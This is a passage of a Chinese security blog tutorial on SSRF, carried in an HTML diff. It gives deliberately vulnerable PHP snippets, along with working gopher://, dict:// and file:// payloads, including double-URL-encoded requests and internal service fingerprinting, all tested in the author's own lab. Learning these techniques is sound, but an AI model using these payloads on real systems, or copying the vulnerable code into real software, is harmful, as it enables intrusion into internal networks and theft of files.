@@ -1,0 +1,2226 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="ssrf, Ethe&#39;s blog">
+    <meta name="description" content="SSRF首先，什么是ssrf？ SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL ，以获取受保护网络内的资源的一种安全漏洞。SS">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>ssrf | Ethe&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size: cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Ethe&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Ethe&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">ssrf</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: scroll;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">web学习</span>
+                            </a>
+                        
+                            <a href="/tags/ssrf/">
+                                <span class="chip bg-color">ssrf</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-04-26
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2022-04-29
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    9.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    42 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="首先，什么是ssrf？"><a href="#首先，什么是ssrf？" class="headerlink" title="首先，什么是ssrf？"></a><strong>首先，什么是ssrf？</strong></h3><p> SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL ，以获取受保护网络内的资源的一种安全漏洞。SSRF 常被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问限制的主机。</p>
+<p> SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。</p>
+<p> 请求地址被恶意利用的话，如下图所示，就能够以服务端的身份向任意地址发起请求，如果是一台存在远程代码执行漏洞的内网机器，借助 SSRF 漏洞就可以获取该内网机器的控制权。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/v2-6dc1016bfa442bbdf844b3ecf4f15d93_720w.jpg" alt="img"></p>
+<h3 id="ssrf的危害"><a href="#ssrf的危害" class="headerlink" title="ssrf的危害"></a>ssrf的危害</h3><p>内网探测：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描。</p>
+<p>窃取本地和内网敏感数据：访问和下载内网的敏感数据，利用 File 协议访问服务器本地文件。</p>
+<p>攻击服务器本地或内网应用：利用发现的漏洞进一步发起攻击利用。</p>
+<p>跳板攻击：借助存在 SSRF 漏洞的服务器对内或对外发起攻击，以隐藏自己真实 IP。</p>
+<p>绕过安全防御：比如防火墙、CDN（内容分发网络，比如加速乐、百度云加速、安全宝等等）防御。</p>
+<p>拒绝服务攻击：请求超大文件，保持链接 Keep-Alive Always。</p>
+<p>在服务器上搭个环境，看到页面查到的ip是服务器的，而不是本机的ip</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427140646342.png" alt="image-20220427140646342"></p>
+<h3 id="相关危险函数"><a href="#相关危险函数" class="headerlink" title="相关危险函数"></a>相关危险函数</h3><p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。</p>
+<ul>
+<li>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</li>
+</ul>
+<pre class="language-none"><code class="language-none">&lt;?php
+$url &#x3D; $_GET[&#39;url&#39;];;
+echo file_get_contents($url);
+?&gt;</code></pre>
+
+<ul>
+<li>readfile()：输出一个文件的内容。</li>
+<li>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</li>
+</ul>
+<pre class="language-none"><code class="language-none">&lt;?php 
+function GetFile($host,$port,$link) &#123; 
+    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);   
+    if (!$fp) &#123; 
+        echo &quot;$errstr (error number $errno) \n&quot;; 
+    &#125; else &#123; 
+        $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;; 
+        $out .&#x3D; &quot;Host: $host\r\n&quot;; 
+        $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;; 
+        $out .&#x3D; &quot;\r\n&quot;; 
+        fwrite($fp, $out); 
+        $contents&#x3D;&#39;&#39;; 
+        while (!feof($fp)) &#123; 
+            $contents.&#x3D; fgets($fp, 1024); 
+        &#125; 
+        fclose($fp); 
+        return $contents; 
+    &#125; 
+&#125;
+?&gt;</code></pre>
+
+<ul>
+<li>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</li>
+</ul>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php 
+if (isset($_POST[&#39;url&#39;]))&#123;
+    $link &#x3D; $_POST[&#39;url&#39;];
+    $curlobj &#x3D; curl_init();&#x2F;&#x2F; 创建新的 cURL 资源
+    curl_setopt($curlobj, CURLOPT_POST, 0);
+    curl_setopt($curlobj,CURLOPT_URL,$link);
+    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; 设置 URL 和相应的选项
+    $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; 抓取 URL 并把它传递给浏览器
+    curl_close($curlobj);&#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源</code></pre>
+
+<ul>
+<li>fopen()：打开一个文件文件或者 URL。</li>
+<li>……</li>
+</ul>
+<p>一些tips</p>
+<pre class="language-none"><code class="language-none">1.一般情况下PHP不会开启fopen的gopher wrapper
+2.file_get_contents的gopher协议不能URL编码
+3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
+4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
+5.curl_exec() &#x2F;&#x2F;默认不跟踪跳转，
+6.file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议</code></pre>
+
+<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul>
+<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
+<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
+<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
+<li>http/s协议：探测内网主机存活</li>
+</ul>
+<p>贴一下国光师傅的博客</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>
+<h1 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h1><p>file协议主要用于访问本地计算机中的文件，命令格式为：</p>
+<pre class="language-text" data-language="text"><code class="language-text">file:&#x2F;&#x2F;文件路径</code></pre>
+
+<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>使用file协议进行的任意文件读取算是ssrf最简单的利用方式了<br>首先先写一段有ssrf漏洞的代码，命名为ssrf.php并部署到服务器上。</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+    highlight_file(&#39;shell.php&#39;);
+    $url &#x3D; $_GET[&#39;url&#39;];
+    echo($url);
+    $curlobj &#x3D; curl_init($url);
+    echo curl_exec($curlobj);
+?&gt;</code></pre>
+
+<p>然后就可以利用file协议进行读取文件操作了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427171515601.png" alt="image-20220427171515601"></p>
+<p>另外，如果是宝塔建的站，记得复现的时候把这个防跨站攻击关了，不然什么也读不到</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427171629925.png" alt="image-20220427171629925"></p>
+<h3 id="file协议与http协议的区别"><a href="#file协议与http协议的区别" class="headerlink" title="file协议与http协议的区别"></a>file协议与http协议的区别</h3><ul>
+<li>file协议主要用于读取服务器本地文件，访问的是本地的静态资源</li>
+<li>http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析</li>
+<li>http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</li>
+<li>file对应的类似http的协议是ftp协议（文件传输协议）</li>
+<li>file不能跨域</li>
+</ul>
+<h1 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h1><h3 id="协议简介"><a href="#协议简介" class="headerlink" title="协议简介"></a>协议简介</h3><p>gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。<br>它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。<br>gopher 协议使用tcp 可靠连接。</p>
+<p>gopher协议是比http协议更早出现的协议，现在已经不常用了，但是在SSRF漏洞利用中gopher可以说是万金油，因为<strong>可以使用gopher发送各种格式的请求包，这样就可以解决漏洞点不在GET参数的问题</strong>了。 </p>
+<h3 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h3><pre class="language-none"><code class="language-none">URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</code></pre>
+
+<ul>
+<li>gopher的默认端口是70</li>
+<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
+<li><code>&lt;gopher-path&gt;</code>其中<code>&lt;gopher-path&gt;</code>格式可以是如下其中的一种<code>&lt;/gopher-path&gt;</code>,当然，这部分也可以省略</li>
+</ul>
+<pre class="language-none"><code class="language-none">&lt;gophertype&gt;&lt;selector&gt;
+&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;
+&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher+_string&gt;</code></pre>
+
+<p>整个<code>&lt;gopher-path&gt;</code>部分可以省略，这时候<code>\</code>也可以省略<code>&lt;gophertype&gt;</code>为默认的1。<br><code>&lt;gophertype&gt;</code>是一个单字符用来表示url 资源的类型，在常用的安全测试中发现不管这个字符是什么都不影响，只要有就行了。<br><code>&lt;selector&gt;</code>个人理解这个是包的内容，为了避免一些特殊符号需要进行url 编码，但如果直接把wireshark 中ascii 编码的数据直接进行url 编码然后丢到gopher 协议里跑会出错，得在wireshark 里先换成hex 编码的原始数据后再每两个字符的加上<code>%</code>，通过对比发现直接url 编码的话会少了<code>%0d</code>回车字符。<br><code>&lt;search&gt;</code>用于向gopher 搜索引擎提交搜索数据，和<code>&lt;selector&gt;</code>之间用<code>%09</code>隔开。<br><code>&lt;gopher+_string&gt;</code>是获取gopher+ 项所需的信息，gopher+ 是gopher 协议的升级版。</p>
+<p>先试一下</p>
+<p>vps上监听5001端口，然后在另一台上利用gopher发送请求</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426162607969.png" alt="image-20220426162607969"></p>
+<p>发现虽然发送的请求是abcd但是接收的只有bcd</p>
+<p>这是因为用一个单字符表示了<code>&lt;gophertype&gt;</code>部分</p>
+<h3 id="构造get请求"><a href="#构造get请求" class="headerlink" title="构造get请求"></a>构造get请求</h3><p>网页代码为</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+    echo &quot;Hello &quot;.$_REQUEST[&quot;name&quot;].&quot;\n&quot;
+?&gt;</code></pre>
+
+<p>get的请求方式就是</p>
+<pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426163357450.png" alt="image-20220426163357450"></p>
+<h3 id="构造post请求"><a href="#构造post请求" class="headerlink" title="构造post请求"></a>构造post请求</h3><pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A</code></pre>
+
+<p>与get不同的地方就是要加上Content-Type和Content-Length</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426163600192.png" alt="image-20220426163600192"></p>
+<h3 id="Gopher与get-shell"><a href="#Gopher与get-shell" class="headerlink" title="Gopher与get shell"></a>Gopher与get shell</h3><p>首先准备一个有ssrf漏洞的代码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426164049486.png" alt="image-20220426164049486"></p>
+<p>先试一下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142628212.png" alt="image-20220427142628212"></p>
+<p>那我们能不能用这个代码来读到我们test.php里的内容呢</p>
+<pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A</code></pre>
+
+<p>构造这样的payload，但是发现并没有回显出test.php里的内容</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142655184.png" alt="image-20220427142655184"></p>
+<p>这里是因为在PHP在接收到参数后会做一次URL的解码，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。</p>
+<pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher%3A%2F%2Fip%3A80%2F_GET%2520%2Fssrf%2Ftest%2Ftest.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520ip%250d%250A</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142748085.png" alt="image-20220427142748085"></p>
+<p>成功利用</p>
+<p>剩下的部分搭环境比较麻烦，而且还有的涉及到Java的框架了，不想搭了（瘫，直接贴链接了</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6993">https://xz.aliyun.com/t/6993</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)</a></p>
+<h1 id="DICT协议"><a href="#DICT协议" class="headerlink" title="DICT协议"></a>DICT协议</h1><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。</p>
+<p><a target="_blank" rel="noopener" href="https://wzyboy.im/post/1237.html">使用 dictd 搭建 DICT 字典服务器 | wzyboy’s blog</a></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><pre class="language-sh" data-language="sh"><code class="language-sh">dict:&#x2F;&#x2F;127.0.0.1:端口&#x2F;</code></pre>
+
+
+
+<p>用nc在测试机监听，然后利用ssrf漏洞测试一下dict协议发送字符串info，看看接收方会收到什么：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427190812101.png" alt="image-20220427190812101"></p>
+<p>可以看到一共收到了三行数据，第一行是版本号，第二行是我们发送的数据，第三行是自动添加的QUIT。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427190738841.png" alt="image-20220427190738841"></p>
+<p>成功看到了mysql数据库的版本号</p>
+<p>可以利用dict进行指纹识别</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183350712.png" alt="image-20220429183350712"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183432301.png" alt="image-20220429183432301"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183500425.png" alt="image-20220429183500425"></p>
+<h1 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h1><p>这部分不是很熟，直接上参考文章了</p>
+<p><a target="_blank" rel="noopener" href="https://www.modb.pro/db/163739">https://www.modb.pro/db/163739</a></p>
+<h3 id="什么是FastCGI"><a href="#什么是FastCGI" class="headerlink" title="什么是FastCGI"></a>什么是FastCGI</h3><p>在网站架构中，Web Server（如Nginx）只是内容的分发者</p>
+<p>当客户端请求的是index.php，根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_3920a5e6-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p>
+<p>当Web Server收到 index.php 这个请求后，会启动对应的<strong>CGI 程序</strong>，也就是PHP解析器</p>
+<p>接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以<strong>CGI规范的格式</strong>返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程</p>
+<ul>
+<li><strong>CGI：</strong> 是 Web Server 与 Web Application 之间 <strong>数据交换的一种协议</strong></li>
+<li><strong>FastCGI：</strong> 同 CGI，是一种通信协议，对比 CGI 提升了5倍以上性能</li>
+<li><strong>PHP-CGI：</strong> 是 PHP（Web Application）对 Web Server 提供的 CGI 协议的接口程序</li>
+<li><strong>PHP-FPM：</strong> 是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能的任务管理功能</li>
+</ul>
